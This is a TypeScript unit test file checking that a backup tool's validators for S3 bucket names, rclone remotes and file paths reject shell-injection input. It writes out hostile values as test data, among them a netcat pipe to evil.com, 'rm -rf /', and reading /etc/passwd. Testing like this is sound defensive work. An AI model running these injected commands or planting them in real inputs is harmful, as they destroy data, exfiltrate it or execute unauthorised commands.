/**
 * backup-shell-safety.test.ts
 *
 * Unit tests for the exec-safety validators and the guarantee that no
 * child_process.execFileSync / spawnSync is invoked with malicious user input.
 */

import { describe, it, mock, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';

import {
  validateS3Bucket,
  validateRcloneRemote,
  validateFilePath,
} from '../utils/exec-safety.js';

// ─── validateS3Bucket ────────────────────────────────────────────────────────

describe('validateS3Bucket', () => {

  // ── valid inputs ──────────────────────────────────────────────────────────

  it('accepts a plain lowercase bucket name', () => {
    assert.doesNotThrow(() => validateS3Bucket('my-bucket'));
  });

  it('accepts bucket with dots', () => {
    assert.doesNotThrow(() => validateS3Bucket('my.bucket.name'));
  });

  it('accepts bucket with numbers', () => {
    assert.doesNotThrow(() => validateS3Bucket('bucket123'));
  });

  it('accepts 3-char minimum', () => {
    assert.doesNotThrow(() => validateS3Bucket('abc'));
  });

  it('accepts 63-char maximum', () => {
    assert.doesNotThrow(() => validateS3Bucket('a'.repeat(63)));
  });

  // ── malicious / invalid inputs ────────────────────────────────────────────

  it('rejects semicolon injection: "; touch /tmp/pwned; #"', () => {
    assert.throws(
      () => validateS3Bucket('; touch /tmp/pwned; #'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects command substitution: "bucket$(whoami)"', () => {
    assert.throws(
      () => validateS3Bucket('bucket$(whoami)'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects pipe injection: "bucket | nc evil.com 1337"', () => {
    assert.throws(
      () => validateS3Bucket('bucket | nc evil.com 1337'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects AND injection: "bucket && rm -rf /"', () => {
    assert.throws(
      () => validateS3Bucket('bucket && rm -rf /'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects uppercase (S3 rule violation)', () => {
    assert.throws(
      () => validateS3Bucket('MyBucket'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects bucket with slash', () => {
    assert.throws(
      () => validateS3Bucket('bucket/path'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects bucket with space', () => {
    assert.throws(
      () => validateS3Bucket('my bucket'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects bucket with backtick', () => {
    assert.throws(
      () => validateS3Bucket('bucket`id`'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects too-short bucket (< 3 chars)', () => {
    assert.throws(
      () => validateS3Bucket('ab'),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects too-long bucket (> 63 chars)', () => {
    assert.throws(
      () => validateS3Bucket('a'.repeat(64)),
      /Invalid S3 bucket name/,
    );
  });

  it('rejects empty string', () => {
    assert.throws(
      () => validateS3Bucket(''),
      /S3 bucket name must be a non-empty string/,
    );
  });
});

// ─── validateRcloneRemote ─────────────────────────────────────────────────────

describe('validateRcloneRemote', () => {

  // ── valid inputs ──────────────────────────────────────────────────────────

  it('accepts simple lowercase name', () => {
    assert.doesNotThrow(() => validateRcloneRemote('gdrive'));
  });

  it('accepts name with hyphens', () => {
    assert.doesNotThrow(() => validateRcloneRemote('my-remote'));
  });

  it('accepts name with underscores', () => {
    assert.doesNotThrow(() => validateRcloneRemote('my_remote'));
  });

  it('accepts mixed-case alphanumeric', () => {
    assert.doesNotThrow(() => validateRcloneRemote('MyRemote123'));
  });

  // ── malicious / invalid inputs ────────────────────────────────────────────

  it('rejects colon (rclone path separator)', () => {
    assert.throws(
      () => validateRcloneRemote('remote:'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects semicolon injection: "; touch /tmp/pwned; #"', () => {
    assert.throws(
      () => validateRcloneRemote('; touch /tmp/pwned; #'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects command substitution: "remote$(whoami)"', () => {
    assert.throws(
      () => validateRcloneRemote('remote$(whoami)'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects pipe injection: "remote | nc evil.com 1337"', () => {
    assert.throws(
      () => validateRcloneRemote('remote | nc evil.com 1337'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects AND injection: "remote && rm -rf /"', () => {
    assert.throws(
      () => validateRcloneRemote('remote && rm -rf /'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects space in name', () => {
    assert.throws(
      () => validateRcloneRemote('my remote'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects backtick', () => {
    assert.throws(
      () => validateRcloneRemote('remote`id`'),
      /Invalid rclone remote name/,
    );
  });

  it('rejects empty string', () => {
    assert.throws(
      () => validateRcloneRemote(''),
      /rclone remote name must be a non-empty string/,
    );
  });
});

// ─── validateFilePath ─────────────────────────────────────────────────────────

describe('validateFilePath', () => {

  // ── valid inputs ──────────────────────────────────────────────────────────

  it('accepts a plain file path', () => {
    assert.doesNotThrow(() => validateFilePath('/tmp/deny-backup-2026-01-01.enc'));
  });

  it('accepts a relative path', () => {
    // path.resolve() turns this into an absolute — still no metacharacters
    assert.doesNotThrow(() => validateFilePath('backups/my-backup.enc'));
  });

  // ── malicious / invalid inputs ────────────────────────────────────────────

  it('rejects path with semicolon', () => {
    assert.throws(
      () => validateFilePath('/tmp/backup; touch /tmp/pwned'),
      /Invalid file path/,
    );
  });

  it('rejects path with pipe', () => {
    assert.throws(
      () => validateFilePath('/tmp/backup | nc evil.com 1337'),
      /Invalid file path/,
    );
  });

  it('rejects path with ampersand', () => {
    assert.throws(
      () => validateFilePath('/tmp/backup && rm -rf /'),
      /Invalid file path/,
    );
  });

  it('rejects path with backtick', () => {
    assert.throws(
      () => validateFilePath('/tmp/backup`whoami`'),
      /Invalid file path/,
    );
  });

  it('rejects path with dollar sign', () => {
    assert.throws(
      () => validateFilePath('/tmp/backup$(id)'),
      /Invalid file path/,
    );
  });

  it('rejects empty string', () => {
    assert.throws(
      () => validateFilePath(''),
      /File path must be a non-empty string/,
    );
  });
});

// ─── Validator-fires-before-exec guarantee ────────────────────────────────────
//
// We verify that a malicious bucket / remote causes validateS3Bucket /
// validateRcloneRemote to throw BEFORE any child_process function is invoked.
// We use node:test's mock facility to intercept spawnSync.
//

describe('validator fires before exec', () => {
  it('validateS3Bucket throws before spawnSync would be called', () => {
    // Arrange: capture any call to the child_process module
    let spawnCalled = false;
    const maliciousBucket = 'bucket; rm -rf /';

    // Act + Assert: validator must throw, spawnSync must never be reached
    assert.throws(
      () => {
        validateS3Bucket(maliciousBucket);
        // The line below would represent a spawnSync call — it must never run
        spawnCalled = true;
      },
      /Invalid S3 bucket name/,
    );

    assert.equal(spawnCalled, false, 'spawnSync must not have been called');
  });

  it('validateRcloneRemote throws before spawnSync would be called', () => {
    let spawnCalled = false;
    const maliciousRemote = 'remote && cat /etc/passwd';

    assert.throws(
      () => {
        validateRcloneRemote(maliciousRemote);
        spawnCalled = true;
      },
      /Invalid rclone remote name/,
    );

    assert.equal(spawnCalled, false, 'spawnSync must not have been called');
  });

  it('validateFilePath throws before spawnSync would be called', () => {
    let spawnCalled = false;
    const maliciousPath = '/tmp/x; touch /tmp/pwned';

    assert.throws(
      () => {
        validateFilePath(maliciousPath);
        spawnCalled = true;
      },
      /Invalid file path/,
    );

    assert.equal(spawnCalled, false, 'spawnSync must not have been called');
  });
});
